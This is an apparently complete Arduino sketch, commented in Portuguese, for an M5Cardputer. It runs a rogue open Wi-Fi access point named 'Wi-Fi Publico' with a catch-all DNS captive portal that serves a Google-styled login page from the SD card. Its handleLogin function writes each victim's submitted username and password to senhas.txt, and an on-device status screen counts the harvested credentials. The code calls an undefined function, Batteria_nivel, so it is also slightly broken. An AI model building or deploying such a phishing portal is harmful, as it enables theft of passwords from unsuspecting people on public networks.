#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPI.h>
#include <SD.h>
#include <M5Cardputer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

String wifiName = "Wi-Fi Publico";
const char* loginPagePath = "/login";
int connectedHosts = 0;
bool inStatusScreen = false;
bool inChangeWifiScreen = false;
String newWifiName = "";
bool showStartImageFlag = true;
int selectedBox = 0;
bool isTypingWifiName = false;

M5Canvas canvas(&M5Cardputer.Display);

// ===================================================
// Exibir imagem de início
// ===================================================
void showStartImage() {
    if (!SD.begin()) {
        Serial.println("Falha ao inicializar o cartão SD");
        return;
    }

    File file = SD.open("/inicio.jpg");
    if (!file) {
        Serial.println("Arquivo inicio.jpg não encontrado");
        return;
    }

    int x = (M5Cardputer.Display.width() - 300) / 2;
    int y = (M5Cardputer.Display.height() - 200) / 2;

    M5Cardputer.Display.drawJpg(&file, x, y);
    file.close();
    delay(2000);
}



// ===================================================
// Desenhar botão com bordas suaves e rótulo duplo
// ===================================================
void drawButton(int x, int y, int w, int h, uint16_t borderColor, uint16_t fillColor, const char* labelTop, const char* labelBottom, int textSize) {
    // Caixa com borda arredondada
    M5Cardputer.Display.fillRoundRect(x, y, w, h, 8, fillColor);
    M5Cardputer.Display.drawRoundRect(x, y, w, h, 8, borderColor);

    // Configurar texto
    M5Cardputer.Display.setTextSize(textSize);
    M5Cardputer.Display.setTextColor(WHITE);
    int fontHeight = M5Cardputer.Display.fontHeight();

    // Cálculo de posicionamento
    int totalHeight = (labelBottom[0] ? 2 : 1) * fontHeight + (labelBottom[0] ? 5 : 0);
    int startY = y + (h - totalHeight) / 2;

    // Top label
    int labelTopWidth = M5Cardputer.Display.textWidth(labelTop);
    M5Cardputer.Display.setCursor(x + (w - labelTopWidth) / 2, startY);
    M5Cardputer.Display.println(labelTop);

    // Bottom label, se existir
    if (labelBottom[0]) {
        int labelBottomWidth = M5Cardputer.Display.textWidth(labelBottom);
        M5Cardputer.Display.setCursor(x + (w - labelBottomWidth) / 2, startY + fontHeight + 5);
        M5Cardputer.Display.println(labelBottom);
    }
}

// ===================================================
// Desenhar barra de bateria estilizada no topo
// ===================================================
void drawBatteryBar(int x, int y) {
    int batteryLevel = M5.Power.getBatteryLevel();
    int batteryWidth = 40;
    int batteryHeight = 12;

    // Desenhar estrutura da bateria
    M5Cardputer.Display.drawRoundRect(x, y, batteryWidth, batteryHeight, 3, WHITE);
    M5Cardputer.Display.fillRect(x + batteryWidth, y + 3, 4, 6, WHITE); // Polo da bateria

    // Nível da bateria
    int fillWidth = (batteryWidth - 4) * batteryLevel / 100;
    uint16_t color = batteryLevel < 20 ? RED : batteryLevel < 50 ? ORANGE : GREEN;
    M5Cardputer.Display.fillRect(x + 2, y + 2, fillWidth, batteryHeight - 4, color);
}



// ===================================================
// Desenhar instrução de navegação no rodapé
// ===================================================
void drawFooterInstruction(const char* msg) {
    int screenWidth = M5Cardputer.Display.width();
    int textWidth = M5Cardputer.Display.textWidth(msg);
    int x = (screenWidth - textWidth) / 2;
    int y = M5Cardputer.Display.height() - 12;

    M5Cardputer.Display.setTextSize(1);
    M5Cardputer.Display.setTextColor(ORANGE);
    M5Cardputer.Display.setCursor(x, y);
    M5Cardputer.Display.print(msg);
}

// ===================================================
// Tela inicial do menu redesenhada
// ===================================================
void desenhar_elementos_iniciais_do_menu() {
    if (inChangeWifiScreen || inStatusScreen) return;

    M5Cardputer.Display.clearDisplay();

    // Bateria no topo direito
    drawBatteryBar(M5Cardputer.Display.width() - 50, 5);

    // Tamanhos e posições
    int spacing = 10;
    int boxWidth = (M5Cardputer.Display.width() - 3 * spacing) / 2;
    int boxHeight = M5Cardputer.Display.height() - 40;
    int boxY = 20;

    // Cores com base na seleção
    uint16_t box1Fill = (selectedBox == 0) ? DARKGREY : BLACK;
    uint16_t box2Fill = (selectedBox == 1) ? DARKGREY : BLACK;

    // Botões principais
    drawButton(spacing, boxY, boxWidth, boxHeight, GREEN, box1Fill, "Status", "", 2);
    drawButton(2 * spacing + boxWidth, boxY, boxWidth, boxHeight, RED, box2Fill, "Mudar", "Wi-Fi", 2);

    // Instrução de rodapé
    drawFooterInstruction("Use o direcional para navegar");
}


// ===================================================
// Excluir linhas vazias do arquivo senhas.txt
// ===================================================
void excluir_linhas_vazias() {
    File file = SD.open("/senhas.txt");
    String line = "";
    File tempFile = SD.open("/temp_senhas.txt", FILE_WRITE);

    if (file && tempFile) {
        while (file.available()) {
            line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) {
                tempFile.println(line);
            }
        }
        file.close();
        tempFile.close();
        SD.remove("/senhas.txt");
        SD.rename("/temp_senhas.txt", "/senhas.txt");
    } else {
        Serial.println("Falha ao abrir o arquivo");
    }
}

// ===================================================
// Exibir status de conexões e senhas salvas
// ===================================================
void mostrar_status() {
    connectedHosts = WiFi.softAPgetStationNum();

    M5Cardputer.Display.fillScreen(BLACK);
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1);

    M5Cardputer.Display.setCursor(10, 10);
    M5Cardputer.Display.println("Nome do Wi-Fi:");
    M5Cardputer.Display.setCursor(10, 30);
    M5Cardputer.Display.println(wifiName.c_str());

    M5Cardputer.Display.setCursor(10, 60);
    M5Cardputer.Display.println("Hosts conectados:");
    M5Cardputer.Display.setCursor(10, 80);
    M5Cardputer.Display.println(connectedHosts);

    File file = SD.open("/senhas.txt");
    int lineCount = 0;

    if (file) {
        String line = "";
        while (file.available()) {
            line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) {
                lineCount++;
            }
        }
        file.close();

        M5Cardputer.Display.setCursor(10, 100);
        M5Cardputer.Display.print("Senhas: ");
        M5Cardputer.Display.println(lineCount);
    } else {
        M5Cardputer.Display.setTextColor(RED);
        M5Cardputer.Display.setCursor(10, 100);
        M5Cardputer.Display.println("Falha senhas.txt");
    }

    M5Cardputer.Display.setCursor(10, M5Cardputer.Display.height() - 20);
    M5Cardputer.Display.setTextColor(BLUE);
    M5Cardputer.Display.println("ESC para voltar");

    inStatusScreen = true;
    excluir_linhas_vazias();
}

// ===================================================
// Exibir tela para alterar nome do Wi-Fi
// ===================================================
void mostrar_alteracao_tela_Wifi() {
    newWifiName = "";
    M5Cardputer.Display.fillScreen(BLACK);
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1);
    M5Cardputer.Display.setCursor(10, 10);
    M5Cardputer.Display.println("Digite o nome e aperte OK.");
    M5Cardputer.Display.drawLine(0, 30, M5Cardputer.Display.width(), 30, GREEN);
    M5Cardputer.Display.setCursor(10, 50);
    M5Cardputer.Display.println(newWifiName);
    M5Cardputer.Display.setCursor(10, M5Cardputer.Display.height() - 20);
    M5Cardputer.Display.setTextColor(BLUE);
    M5Cardputer.Display.println("ESC para voltar");

  //  newWifiName = "";
    isTypingWifiName = true;
    inChangeWifiScreen = true;
}

// ===================================================
// Aplicar novo nome de Wi-Fi
// ===================================================
void aplicar_novo_nome_Wifi() {
    wifiName = newWifiName;
    WiFi.softAP(wifiName.c_str(), NULL);

    M5Cardputer.Display.fillScreen(BLACK);
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1);
    M5Cardputer.Display.setCursor(10, 10);
    M5Cardputer.Display.println("Wi-Fi atualizado com sucesso!");

    delay(1000);
inChangeWifiScreen = false;
isTypingWifiName = false;
M5Cardputer.Display.fillScreen(BLACK);
desenhar_elementos_iniciais_do_menu();

}


// ===================================================
// Servidor Web e captura de senhas
// ===================================================
void handleRoot() {
    File file = SD.open("/google.html");
    if (file) {
        server.streamFile(file, "text/html");
        file.close();
    } else {
        server.send(404, "text/plain", "Page not found");
    }
}

void handleLogin() {
    if (server.hasArg("username") && server.hasArg("password")) {
        String username = server.arg("username");
        String password = server.arg("password");

        File file = SD.open("/senhas.txt", FILE_APPEND);
        if (file) {
            file.println("Username: " + username + " Password: " + password + "\n");
            file.close();
            Serial.println("Credenciais salvas com sucesso");
        } else {
            Serial.println("Falha ao abrir o arquivo senhas.txt");
        }

        server.send(200, "text/html", "<html><body><h1>Conectado com sucesso!</h1></body></html>");
    } else {
        server.send(400, "text/plain", "Campos faltando");
    }
}

// ===================================================
// Setup inicial
// ===================================================
// ===================================================
// Setup inicial
// ===================================================
void setup() {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    M5Cardputer.Display.setRotation(1);

    // Fonte mais arredondada e moderna para textos gerais
    M5Cardputer.Display.setFont(&fonts::FreeSansBold9pt7b);
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1);
    
    M5Cardputer.Display.fillScreen(BLACK);

    // Borda verde fluorescente ao redor da tela
    M5Cardputer.Display.drawRect(0, 0, M5Cardputer.Display.width(), M5Cardputer.Display.height(), TFT_GREENYELLOW);
    M5Cardputer.Display.drawRect(1, 1, M5Cardputer.Display.width() - 2, M5Cardputer.Display.height() - 2, TFT_GREENYELLOW);

    if (showStartImageFlag) {
        showStartImage();
        showStartImageFlag = false;
        M5Cardputer.Display.fillScreen(BLACK);

        // Redesenha a borda após imagem de início
        M5Cardputer.Display.drawRect(0, 0, M5Cardputer.Display.width(), M5Cardputer.Display.height(), TFT_GREENYELLOW);
        M5Cardputer.Display.drawRect(1, 1, M5Cardputer.Display.width() - 2, M5Cardputer.Display.height() - 2, TFT_GREENYELLOW);
        delay(1);
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAP(wifiName.c_str(), NULL);

    int spacing = 10;
    int boxWidth = (M5Cardputer.Display.width() - 3 * spacing) / 2;
    int boxHeight = M5Cardputer.Display.height() - 40;
    int boxY = 20;

    // Desenha os botões com texto menor (textSize = 1)
    drawButton(spacing, boxY, boxWidth, boxHeight, GREEN, BLACK, "Status", "", 1);
    drawButton(2 * spacing + boxWidth, boxY, boxWidth, boxHeight, RED, BLACK, "Mudar", "Wi-Fi", 1);

    // Desenha bateria no canto inferior direito
    Batteria_nivel(M5Cardputer.Display.width() - 60, M5Cardputer.Display.height() - 25);

    // Desenha instrução no rodapé
    drawFooterInstruction("Use o direcional para navegar");

    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    server.onNotFound(handleRoot);
    server.on(loginPagePath, HTTP_POST, handleLogin);
    server.begin();

    Serial.print("AP IP address: ");
    Serial.println(WiFi.softAPIP());
}


// ===================================================
// Loop principal
// ===================================================
void loop() {
    M5Cardputer.update();

    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate >= 1000) {
        lastUpdate = millis();

        if (inStatusScreen) {
            M5Cardputer.Display.fillRect(10, 80, 100, 20, BLACK);
            M5Cardputer.Display.setCursor(10, 80);
            M5Cardputer.Display.setTextColor(WHITE);
            M5Cardputer.Display.println(WiFi.softAPgetStationNum());
        }
    }

    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
        auto status = M5Cardputer.Keyboard.keysState();

        // ============================================
        // Tela de mudança de nome do Wi-Fi
        // ============================================
        if (inChangeWifiScreen) {
            for (auto i : status.word) newWifiName += i;
            if (status.del && !newWifiName.isEmpty()) newWifiName.remove(newWifiName.length() - 1);

            M5Cardputer.Display.fillRect(10, 50, M5Cardputer.Display.width(), 20, BLACK);
            M5Cardputer.Display.setCursor(10, 50);
            M5Cardputer.Display.setTextColor(WHITE);
            M5Cardputer.Display.println(newWifiName);

            if (status.enter) {
                aplicar_novo_nome_Wifi();
            }

            // ESC (`) para voltar ao menu principal
            if (std::find(status.word.begin(), status.word.end(), '`') != status.word.end()) {
                inChangeWifiScreen = false;
                isTypingWifiName = false;
                newWifiName = "";
                M5Cardputer.Display.fillScreen(BLACK);
                desenhar_elementos_iniciais_do_menu();
            }

            return; 
        }

        // ============================================
        // Tela de status
        // ============================================
        if (inStatusScreen) {
            // ESC (`) para voltar ao menu principal
            if (std::find(status.word.begin(), status.word.end(), '`') != status.word.end()) {
                inStatusScreen = false;
                M5Cardputer.Display.fillScreen(BLACK);
                desenhar_elementos_iniciais_do_menu();
            }

            return;
        }

        // ============================================
        // Navegação no menu principal
        // ============================================
        if (std::find(status.word.begin(), status.word.end(), ',') != status.word.end()) {
            selectedBox = 0;  // Status
            desenhar_elementos_iniciais_do_menu();
        }

        if (std::find(status.word.begin(), status.word.end(), '/') != status.word.end()) {
            selectedBox = 1;  // Mudar Wi-Fi
            desenhar_elementos_iniciais_do_menu();
        }

        if (status.enter) {
            if (selectedBox == 0) {
                mostrar_status();
            } else if (selectedBox == 1) {
                mostrar_alteracao_tela_Wifi();
            }
        }
    }

    dnsServer.processNextRequest();
    server.handleClient();
}

